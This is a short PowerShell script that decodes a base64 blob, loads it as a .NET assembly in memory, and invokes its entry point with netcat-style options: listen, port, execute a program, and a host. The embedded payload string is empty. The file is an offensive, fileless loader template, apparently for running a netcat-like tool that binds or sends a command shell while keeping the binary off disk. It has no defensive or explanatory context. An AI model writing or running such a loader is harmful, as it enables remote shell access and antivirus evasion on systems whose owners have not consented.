param(
    [string]$h,
    [int]$p,
    [string]$e,
    [switch]$l
)
$b64 = ""
$b = [Convert]::FromBase64String($b64)
$a = [Reflection.Assembly]::Load($b)
$args = @()
if($l){ $args += "-l" }
if($p){ $args += "-p"; $args += "$p" }
if($e){ $args += "-e"; $args += $e }
if($h){ $args += $h }
$a.EntryPoint.Invoke($null, @(,[string[]]@($args)))
